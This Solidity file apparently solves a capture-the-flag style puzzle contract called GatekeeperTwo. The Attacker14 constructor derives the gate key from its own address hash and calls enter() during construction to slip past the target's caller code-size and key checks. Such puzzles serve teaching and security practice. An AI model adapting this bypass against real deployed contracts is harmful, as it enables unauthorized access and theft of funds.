// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract GatekeeperTwo {
    function enter(bytes8 _gateKey) public virtual returns (bool);
}

contract Attacker14 {
    constructor(address targetAddr) {
        bytes8 _gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
        GatekeeperTwo(targetAddr).enter(_gateKey);
    }
}
